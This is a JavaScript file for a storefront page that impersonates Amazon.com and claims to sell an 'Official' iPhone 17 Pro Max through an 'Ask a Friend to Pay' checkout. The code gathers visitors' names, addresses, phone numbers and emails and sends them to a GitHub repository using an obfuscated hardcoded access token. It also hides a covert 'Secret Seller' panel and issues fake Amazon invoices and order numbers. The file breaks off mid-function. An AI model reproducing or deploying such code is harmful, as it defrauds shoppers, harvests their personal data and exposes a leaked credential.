/**
 * Amazon.com - Official Apple iPhone 17 Pro Max Showcase & Fluid Checkout
 * 100% Real Official Images, Dynamic Real-Time Dates, Friend-Perspective Ordering
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple iPhone 17 Pro Max",
  colors: {
    "Cosmic Orange": {
      img: PATH_PREFIX + "images/iphone/iphone17-cosmic-orange.jpg",
      thumb: PATH_PREFIX + "images/iphone/iphone17-cosmic-orange.jpg",
      swatchClass: "swatch-cosmic-orange"
    },
    "Deep Blue": {
      img: PATH_PREFIX + "images/iphone/iphone17-deep-blue.jpg",
      thumb: PATH_PREFIX + "images/iphone/iphone17-deep-blue.jpg",
      swatchClass: "swatch-deep-blue"
    },
    "Silver": {
      img: PATH_PREFIX + "images/iphone/iphone17-silver.jpg",
      thumb: PATH_PREFIX + "images/iphone/iphone17-silver.jpg",
      swatchClass: "swatch-silver"
    }
  },
  storagePrices: {
    "256 GB": 1699,
    "512 GB": 1899,
    "1 TB": 2099
  }
};

// Current Session State
const state = {
  color: "Cosmic Orange",
  storage: "256 GB",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  placedOrder: null
};

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers (Automatically changes with system clock)
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

// Expected dates are left blank without auto-calculation as requested

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
//  Commits order details directly to 'orders.json' and 'order.json' across stores & root
//  https://github.com/amazon-shopping-official/amazon-shopping-official.github.io
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/iphone17promax",
  filePath: "store/iphone17promax/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      // Check if exact order ID already exists in this file
      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function fetchOrdersFromAPI() {
  const local = JSON.parse(localStorage.getItem('amazon_placed_orders_iphone') || localStorage.getItem('amazon_placed_orders') || '[]');
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to localStorage:', err.message);
    return local;
  }
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`
  ];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

document.addEventListener("DOMContentLoaded", () => {
  setupProductOptions();
  setupBuyNow();
  setupCheckoutAccordion();
  setupOrdersDrawer();
  setupAmazonRedirects();
  setupLanguageSwitcher();
  updateOrdersBadge();
});

// 1. Product Options, Swatches, and Image Sync
function setupProductOptions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const productTitle = document.getElementById("productTitle");
  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const currentColorText = document.getElementById("currentColorText");
  const currentStorageText = document.getElementById("currentStorageText");
  const swatches = document.querySelectorAll(".swatch-btn");
  const thumbs = document.querySelectorAll(".thumb-item");
  const storageBtns = document.querySelectorAll(".storage-choice");
  // Check URL parameters for creator pre-selected options (e.g. ?color=Deep+Blue&storage=512+GB)
  const urlParams = new URLSearchParams(window.location.search);
  const pColor = urlParams.get("color");
  const pStorage = urlParams.get("storage");
  if (pColor && PRODUCT.colors[pColor]) state.color = pColor;
  if (pStorage && PRODUCT.storagePrices[pStorage]) state.storage = pStorage;

  function refreshPricingAndImages() {
    const unit = PRODUCT.storagePrices[state.storage] || 1699;
    const total = unit * state.qty;

    centerPrice.textContent = unit.toLocaleString();
    buyBoxPrice.textContent = formatMoney(total);
    productTitle.textContent = `${PRODUCT.title} (${state.storage}) - ${state.color} (Unlocked)`;
    currentColorText.textContent = state.color;
    currentStorageText.textContent = state.storage;

    const colorData = PRODUCT.colors[state.color];
    if (colorData && colorData.img) {
      if (!mainPhoto.src.endsWith(colorData.img)) {
        mainPhoto.style.opacity = '0.35';
        mainPhoto.style.transform = 'scale(0.97)';
        setTimeout(() => {
          mainPhoto.src = colorData.img;
          mainPhoto.alt = `${PRODUCT.title} in ${state.color}`;
          mainPhoto.style.opacity = '1';
          mainPhoto.style.transform = 'scale(1)';
        }, 110);
      } else {
        mainPhoto.alt = `${PRODUCT.title} in ${state.color}`;
      }
    }

    // Sync active swatch button
    swatches.forEach(b => {
      b.classList.toggle("active", b.dataset.color === state.color);
    });

    // Sync active thumbnail
    thumbs.forEach(t => {
      t.classList.toggle("active", t.dataset.color === state.color);
    });
  }

  // Swatch click handlers
  swatches.forEach(btn => {
    btn.addEventListener("click", () => {
      state.color = btn.dataset.color;
      refreshPricingAndImages();
    });
  });

  // Thumbnail click handlers
  thumbs.forEach(t => {
    t.addEventListener("click", () => {
      thumbs.forEach(b => b.classList.remove("active"));
      t.classList.add("active");

      if (t.dataset.color && PRODUCT.colors[t.dataset.color]) {
        state.color = t.dataset.color;
        refreshPricingAndImages();
      } else if (t.dataset.img) {
        if (!mainPhoto.src.endsWith(t.dataset.img)) {
          mainPhoto.style.opacity = '0.35';
          mainPhoto.style.transform = 'scale(0.97)';
          setTimeout(() => {
            mainPhoto.src = t.dataset.img;
            mainPhoto.style.opacity = '1';
            mainPhoto.style.transform = 'scale(1)';
          }, 110);
        }
      }
    });
  });

  // Storage option clicks
  storageBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      storageBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.storage = btn.dataset.storage;
      refreshPricingAndImages();
    });
  });

  // Quantity dropdown change
  selectQty.addEventListener("change", (e) => {
    state.qty = Number(e.target.value) || 1;
    refreshPricingAndImages();
  });

  // Initialize
  refreshPricingAndImages();
}

// 2. Navigation & Single "Buy Now" Action
function setupBuyNow() {
  const btnBuyNow = document.getElementById("btnBuyNow");
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const logoHomeLink = document.getElementById("logoHomeLink");
  const btnBackToProduct = document.getElementById("btnBackToProduct");
  const btnBackToProductPage = document.getElementById("btnBackToProductPage");

  function openCheckout(pushState = true) {
    const unit = PRODUCT.storagePrices[state.storage] || 1699;
    const total = unit * state.qty;

    // Populate checkout item details
    document.getElementById("reviewItemTitle").textContent = `${PRODUCT.title} (${state.storage}) - ${state.color}`;
    document.getElementById("reviewItemQty").textContent = state.qty;
    document.getElementById("reviewItemPrice").textContent = formatMoney(total);
    document.getElementById("reviewItemPhoto").src = PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/iphone/iphone17-cosmic-orange.jpg");

    document.getElementById("csItemsPrice").textContent = formatMoney(total);
    document.getElementById("csTotalPrice").textContent = formatMoney(total);

    // Transition smoothly
    document.getElementById("orderConfirmationScreen").classList.remove("active");
    document.getElementById("checkoutGridArea").style.display = "grid";
    viewProduct.style.display = "none";
    viewCheckout.classList.add("active");
    window.scrollTo({ top: 0, behavior: "smooth" });

    if (pushState) {
      history.pushState({ view: "checkout" }, "", "#checkout");
    }
  }

  function returnToProduct(pushState = true) {
    document.getElementById("orderConfirmationScreen").classList.remove("active");
    document.getElementById("checkoutGridArea").style.display = "grid";
    viewCheckout.classList.remove("active");
    viewProduct.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });

    if (pushState && window.location.hash !== "") {
      history.pushState({ view: "product" }, "", window.location.pathname + window.location.search);
    }
  }

  btnBuyNow.addEventListener("click", () => openCheckout(true));

  if (btnBackToProduct) {
    btnBackToProduct.addEventListener("click", () => {
      if (window.history.length > 1 && window.location.hash === "#checkout") {
        window.history.back();
      } else {
        returnToProduct(true);
      }
    });
  }

  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => returnToProduct(true));
  }

  logoHomeLink.addEventListener("click", (e) => {
    e.preventDefault();
    returnToProduct(true);
  });

  // Listen for browser back / forward buttons and mobile swipe gestures
  window.addEventListener("popstate", (e) => {
    const view = e.state?.view || (window.location.hash === "#checkout" ? "checkout" : (window.location.hash === "#confirmation" ? "confirmation" : "product"));
    if (view === "checkout") {
      openCheckout(false);
    } else if (view === "confirmation") {
      document.getElementById("checkoutGridArea").style.display = "none";
      document.getElementById("orderConfirmationScreen").classList.add("active");
      viewProduct.style.display = "none";
      viewCheckout.classList.add("active");
    } else {
      returnToProduct(false);
    }
  });

  // Handle initial page load with hash
  if (window.location.hash === "#checkout") {
    openCheckout(false);
  }
}

// 3. Multi-Step Checkout Accordion
function setupCheckoutAccordion() {
  // Step 1: Address
  const addressForm = document.getElementById("addressForm");
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");

  // Step 2: Payment
  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnContinueToReview = document.getElementById("btnContinueToReview");
  const btnEditPayment = document.getElementById("btnEditPayment");

  // Step 3: Review
  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");

  // Payment Options
  const paymentOptions = document.querySelectorAll(".payment-option:not(.disabled)");

  // 1. Save 4-Field Simplified Shipping Address (Friend enters their details)
  addressForm.addEventListener("submit", (e) => {
    e.preventDefault();

    const fullName = document.getElementById("inputFullName").value.trim();
    const deliveryAddress = document.getElementById("inputDeliveryAddress").value.trim();
    const phone = document.getElementById("inputPhone").value.trim();
    const email = document.getElementById("inputEmail").value.trim();

    state.address = {
      fullName,
      deliveryAddress,
      phone,
      email
    };

    // Update Header Deliver-to Text with Friend's Name
    const headerLoc = document.getElementById("headerLocText");
    if (headerLoc) {
      headerLoc.textContent = fullName;
    }

    // Collapse Step 1 & show summary
    stepAddressBody.style.display = "none";
    stepAddressSummary.style.display = "block";
    stepAddressSummary.innerHTML = `
      <strong>${fullName}</strong><br>
      ${deliveryAddress}<br>
      Phone: ${phone} &bull; Email: ${email}
    `;
    btnEditAddress.style.display = "inline-block";
    stepCardAddress.classList.remove("active");
    stepCardAddress.classList.add("completed");

    // Advance to Step 2
    stepCardPayment.classList.add("active");
    stepPaymentBody.style.display = "block";
    stepPaymentBody.scrollIntoView({ behavior: "smooth", block: "nearest" });
  });

  // Edit Step 1
  btnEditAddress.addEventListener("click", () => {
    stepAddressBody.style.display = "block";
    stepAddressSummary.style.display = "none";
    btnEditAddress.style.display = "none";
    stepCardAddress.classList.add("active");
    stepCardAddress.classList.remove("completed");
  });

  // 2. Select Payment Method
  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector("input[type='radio']");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }
    });
  });

  // Continue to Step 3 Review
  btnContinueToReview.addEventListener("click", () => {
    stepPaymentBody.style.display = "none";
    stepPaymentSummary.style.display = "block";
    stepPaymentSummary.innerHTML = `
      <strong>Payment Method:</strong> ${state.paymentMethod}<br>
      <span style="font-size:12px; color:#555;">${state.paymentMethod === 'Ask a Friend to Pay' ? 'Friend will complete billing &bull; Package ships to your address' : 'Pay in cash upon delivery'}</span>
    `;
    btnEditPayment.style.display = "inline-block";
    stepCardPayment.classList.remove("active");
    stepCardPayment.classList.add("completed");

    // Advance to Step 3
    stepCardReview.classList.add("active");
    stepReviewBody.style.display = "block";
    stepReviewBody.scrollIntoView({ behavior: "smooth", block: "nearest" });
  });

  // Edit Step 2
  btnEditPayment.addEventListener("click", () => {
    stepPaymentBody.style.display = "block";
    stepPaymentSummary.style.display = "none";
    btnEditPayment.style.display = "none";
    stepCardPayment.classList.add("active");
    stepCardPayment.classList.remove("completed");
  });

  // Back to step 1 from step 2
  const btnBackToAddress = document.getElementById("btnBackToAddress");
  if (btnBackToAddress) {
    btnBackToAddress.addEventListener("click", () => {
      btnEditAddress.click();
    });
  }

  // Back to step 2 from step 3
  const btnBackToPayment = document.getElementById("btnBackToPayment");
  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      btnEditPayment.click();
    });
  }

  // 3. Place Order Triggers
  function triggerPlaceOrder() {
    // Auto-capture address if typed in fields without clicking "Use this address"
    if (!state.address) {
      const inputName = document.getElementById("inputFullName");
      const inputAddr = document.getElementById("inputDeliveryAddress");
      const inputPhone = document.getElementById("inputPhone");
      const inputEmail = document.getElementById("inputEmail");
      
      const fullName = inputName ? inputName.value.trim() : "";
      const deliveryAddress = inputAddr ? inputAddr.value.trim() : "";
      const phone = inputPhone ? inputPhone.value.trim() : "";
      const email = inputEmail ? inputEmail.value.trim() : "";

      if (fullName && deliveryAddress) {
        state.address = { fullName, deliveryAddress, phone, email };
        const headerLoc = document.getElementById("headerLocText");
        if (headerLoc) headerLoc.textContent = fullName;
        if (stepAddressBody) stepAddressBody.style.display = "none";
        if (stepAddressSummary) {
          stepAddressSummary.style.display = "block";
          stepAddressSummary.innerHTML = `<strong>${fullName}</strong><br>${deliveryAddress}<br>Phone: ${phone} &bull; Email: ${email}`;
        }
        if (btnEditAddress) btnEditAddress.style.display = "inline-block";
        if (stepCardAddress) {
          stepCardAddress.classList.remove("active");
          stepCardAddress.classList.add("completed");
        }
      } else {
        showToast("Please enter your delivery name and address first.");
        if (btnEditAddress) btnEditAddress.click();
        if (inputName && !fullName) inputName.focus();
        else if (inputAddr && !deliveryAddress) inputAddr.focus();
        return;
      }
    }

    btnFinalPlaceOrder.disabled = true;
    btnSummaryPlaceOrder.disabled = true;
    const origFinalText = btnFinalPlaceOrder.innerHTML;
    const origSummaryText = btnSummaryPlaceOrder.innerHTML;
    btnFinalPlaceOrder.innerHTML = 'Placing your order...';
    btnSummaryPlaceOrder.innerHTML = 'Placing your order...';
    setTimeout(() => {
      finalizeOrderPlacement();
      btnFinalPlaceOrder.disabled = false;
      btnSummaryPlaceOrder.disabled = false;
      btnFinalPlaceOrder.innerHTML = origFinalText;
      btnSummaryPlaceOrder.innerHTML = origSummaryText;
    }, 400);
  }

  btnFinalPlaceOrder.addEventListener("click", triggerPlaceOrder);
  btnSummaryPlaceOrder.addEventListener("click", triggerPlaceOrder);
}

// 4. Finalize Order Placement (Pure Friend Perspective, Dynamic Dates, Zero Links)
function finalizeOrderPlacement() {
  const checkoutGrid = document.getElementById("checkoutGridArea");
  const confScreen = document.getElementById("orderConfirmationScreen");

  const orderNum = "114-" + Math.floor(100000 + Math.random() * 900000) + "-" + Math.floor(1000000 + Math.random() * 9000000);
  const unit = PRODUCT.storagePrices[state.storage] || 1699;
  const total = unit * state.qty;

  const dynamicOrderDate = getDynamicOrderDate();

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  // Populate Confirmation Screen safely
  safeSet("confOrderNumber", orderNum);
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confOrderDate", dynamicOrderDate);
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", `${PRODUCT.title} (${state.storage}) - ${state.color}`);
  safeSet("confQty", state.qty);
  safeSet("confTotal", formatMoney(total));
  safeSet("confPayMethod", state.paymentMethod);

  const confDeliv = document.getElementById("confDeliveryDate");
  if (confDeliv) confDeliv.textContent = "";

  const confFriendNoticeBox = document.getElementById("confFriendNoticeBox");
  const confPaymentStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Ask a Friend to Pay") {
    if (confFriendNoticeBox) confFriendNoticeBox.style.display = "flex";
    if (confPaymentStatus) confPaymentStatus.textContent = "Status: Awaiting payment by friend";
  } else {
    if (confFriendNoticeBox) confFriendNoticeBox.style.display = "none";
    if (confPaymentStatus) confPaymentStatus.textContent = "Status: Pay in cash on delivery";
  }

  // Save to Client LocalStorage and GitHub orders.json (only requested fields)
  const orderRecord = {
    orderId: orderNum,
    timestamp: new Date().toISOString(),
    name: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    item: `${PRODUCT.title} (${state.storage}) - ${state.color}`,
    price: formatMoney(total),
    qty: state.qty,
    payMethod: state.paymentMethod,
    dateStr: dynamicOrderDate
  };

  state.placedOrder = orderRecord;

  // Save locally (instant, works offline)
  try {
    const existingOrders = JSON.parse(localStorage.getItem("amazon_placed_orders_iphone") || localStorage.getItem("amazon_placed_orders") || "[]");
    existingOrders.unshift(orderRecord);
    localStorage.setItem("amazon_placed_orders_iphone", JSON.stringify(existingOrders));
  } catch (err) {
    console.error("Storage error:", err);
  }

  // Also sync to GitHub orders.json & order.json
  saveOrderToAPI(orderRecord);

  // Update Orders Badge Count in Header
  updateOrdersBadge();

  // Show clean Amazon confirmation view
  if (checkoutGrid) checkoutGrid.style.display = "none";
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  try {
    history.pushState({ view: "confirmation" }, "", "#confirmation");
  } catch (e) {}

  showToast("Order placed successfully! Check your email or spam folder for confirmation.");
}

// 6. Seller & Billing Hub (Drawer for the Creator/Store Owner)
function setupOrdersDrawer() {
  const navOrdersBtn = document.getElementById("navOrdersBtn");
  const footerSellerHubLink = document.getElementById("footerSellerHubLink");
  const ordersDrawer = document.getElementById("ordersDrawer");
  const drawerBackdrop = document.getElementById("drawerBackdrop");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const btnExportCsv = document.getElementById("btnExportOrdersCsv");
  const btnClearOrders = document.getElementById("btnClearAllOrders");
  const btnContinueShopping = document.getElementById("btnContinueShopping");

  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoice = document.getElementById("btnCloseInvoiceModal");

  function openDrawer() {
    renderOrdersList();
    ordersDrawer.classList.add("open");
    drawerBackdrop.classList.add("open");
  }

  function closeDrawer() {
    ordersDrawer.classList.remove("open");
    drawerBackdrop.classList.remove("open");
  }

  // Covert Trigger 1: Secret URL Parameter (?admin=1, ?secret=1, ?orders=1, or ?seller=1)
  const urlQuery = new URLSearchParams(window.location.search);
  if (urlQuery.has("admin") || urlQuery.has("secret") || urlQuery.has("orders") || urlQuery.has("seller")) {
    setTimeout(() => {
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    }, 400);
  }

  // Covert Trigger 2: Secret Keyboard Shortcut (Alt + S, Alt + A, or Ctrl + Shift + S)
  window.addEventListener("keydown", (e) => {
    if ((e.altKey && e.key.toLowerCase() === "s") || 
        (e.altKey && e.key.toLowerCase() === "a") || 
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "s")) {
      e.preventDefault();
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    }
  });

  // Top Logo: Direct navigation to Amazon.com
  const logoLink = document.getElementById("logoHomeLink");
  if (logoLink) {
    logoLink.addEventListener("click", () => {
      window.location.href = "https://www.amazon.com";
    });
  }

  // Covert Trigger 3: Secret Gesture (Click / Triple-click the footer Amazon.com text)
  let footerClickCount = 0;
  let footerClickTimer = null;
  const footerTrigger = document.getElementById("footerAdminTrigger");
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      footerClickCount++;
      clearTimeout(footerClickTimer);
      footerClickTimer = setTimeout(() => {
        footerClickCount = 0;
      }, 500);

      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    });
  }

  if (footerSellerHubLink) {
    footerSellerHubLink.addEventListener("click", (e) => {
      e.preventDefault();
      openDrawer();
    });
  }

  btnCloseDrawer.addEventListener("click", closeDrawer);
  drawerBackdrop.addEventListener("click", closeDrawer);

  // Continue Shopping button on confirmation screen
  if (btnContinueShopping) {
    btnContinueShopping.addEventListener("click", () => {
      document.getElementById("orderConfirmationScreen").classList.remove("active");
      document.getElementById("checkoutGridArea").style.display = "grid";
      document.getElementById("viewCheckout").classList.remove("active");
      document.getElementById("viewProductPage").style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
      if (window.location.hash !== "") {
        history.pushState({ view: "product" }, "", window.location.pathname + window.location.search);
      }
    });
  }

  // Export CSV
  if (btnExportCsv) {
    btnExportCsv.addEventListener("click", exportOrdersToCSV);
  }

  // Clear orders
  if (btnClearOrders) {
    btnClearOrders.addEventListener("click", async () => {
      if (confirm("Are you sure you want to clear all order records?")) {
        localStorage.removeItem("amazon_placed_orders_iphone");
        localStorage.removeItem("amazon_placed_orders");
        await deleteOrdersFromAPI();
        updateOrdersBadge();
        renderOrdersList();
        showToast("Order records cleared.");
      }
    });
  }

  // Invoice modal close
  if (btnCloseInvoice) {
    btnCloseInvoice.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
  }
  if (invoiceModal) {
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) {
        invoiceModal.style.display = "none";
      }
    });
  }
}

// Render Saved Orders in Drawer (fetches from Vercel KV API, falls back to localStorage)
async function renderOrdersList() {
  const container = document.getElementById("ordersListContainer");
  if (!container) return;

  container.innerHTML = `<div style="text-align:center; padding:30px; color:#888; font-size:13px;">⏳ Loading orders...</div>`;

  const orders = await fetchOrdersFromAPI();

  if (orders.length === 0) {
    container.innerHTML = `
      <div style="text-align:center; padding:40px 20px; color:#666;">
        <div style="font-size:36px; margin-bottom:12px;">📦</div>
        <strong style="font-size:15px; color:#111; display:block; margin-bottom:6px;">No customer orders placed yet</strong>
        <p style="font-size:13px; color:#777; margin-bottom:16px;">
          When your friend completes an order, their shipping and contact details will appear here.
        </p>
      </div>
    `;
    return;
  }

  container.innerHTML = orders.map((ord, idx) => `
    <div class="order-record-card">
      <div class="orc-top">
        <span>${ord.name || ord.fullName || 'Customer'}</span>
        <span style="color:var(--price-red); font-weight:700;">${ord.price || ord.total || ''}</span>
      </div>
      <div class="orc-product">${ord.item || ''}</div>
      <div class="orc-details">
        <strong>Address:</strong> ${ord.address || ord.deliveryAddress || ''}<br>
        <strong>Phone:</strong> ${ord.phoneNumber || ord.phone || ''}<br>
        <strong>Email:</strong> ${ord.email || ''}
      </div>
      <button class="btn-invoice" onclick="openInvoice(${idx})">
        🧾 Print Customer Statement
      </button>
    </div>
  `).join("");
}

// Open Printable Billing Invoice Modal
window.openInvoice = async function(indexOrId) {
  const orders = await fetchOrdersFromAPI();
  const ord = (typeof indexOrId === 'number') ? orders[indexOrId] : (orders.find(o => o.orderId === indexOrId) || orders[0]);
  if (!ord) return;

  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");

  content.innerHTML = `
    <div style="display:flex; justify-content:space-between; border-bottom:2px solid #131921; padding-bottom:12px; margin-bottom:16px;">
      <div>
        <h2 style="font-size:20px; font-weight:800; color:#131921; letter-spacing:-0.5px;">amazon.com</h2>
        <div style="font-size:12px; color:#555;">Details for ${ord.name || ord.fullName || 'Customer'}</div>
      </div>
      <div style="text-align:right;">
        <strong style="font-size:14px;">CUSTOMER STATEMENT</strong>
      </div>
    </div>

    <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:20px; padding:12px; background:#f9fafb; border-radius:6px; border:1px solid #eee;">
      <div>
        <strong style="font-size:12px; text-transform:uppercase; color:#777;">Customer Details:</strong><br>
        <strong style="font-size:14px; color:#111;">${ord.name || ord.fullName}</strong><br>
        ${ord.address || ord.deliveryAddress}<br>
        Phone: ${ord.phoneNumber || ord.phone}<br>
        Email: ${ord.email}
      </div>
      <div>
        <strong style="font-size:12px; text-transform:uppercase; color:#777;">Order Status:</strong><br>
        Status: <strong>Order Confirmed</strong><br>
        Sold by: Apple Official Store<br>
        Fulfilled by: Amazon.com
      </div>
    </div>

    <table style="width:100%; border-collapse:collapse; margin-bottom:20px; font-size:13px;">
      <thead>
        <tr style="border-bottom:1px solid #ccc; text-align:left; background:#f0f2f2;">
          <th style="padding:8px 10px;">Item Description</th>
          <th style="padding:8px 10px; text-align:center;">Qty</th>
          <th style="padding:8px 10px; text-align:right;">Price</th>
        </tr>
      </thead>
      <tbody>
        <tr style="border-bottom:1px solid #eee;">
          <td style="padding:10px;">
            <strong>${ord.item}</strong><br>
            <span style="font-size:11px; color:#666;">Condition: New &bull; Official Apple Warranty</span>
          </td>
          <td style="padding:10px; text-align:center;">1</td>
          <td style="padding:10px; text-align:right;">${ord.price || ord.total}</td>
        </tr>
      </tbody>
      <tfoot>
        <tr style="font-size:15px; font-weight:700; border-top:2px solid #111;">
          <td colspan="2" style="padding:10px; text-align:right;">Grand Total:</td>
          <td style="padding:10px; text-align:right; color:#b12704;">${ord.price || ord.total}</td>
        </tr>
      </tfoot>
    </table>

    <div style="font-size:11px; color:#777; border-top:1px solid #eee; padding-top:12px; text-align:center;">
      This statement confirms details recorded directly on Amazon.com.
    </div>
  `;

  modal.style.display = "flex";
};

// Export All Collected Orders to CSV File
async function exportOrdersToCSV() {
  const orders = await fetchOrdersFromAPI();
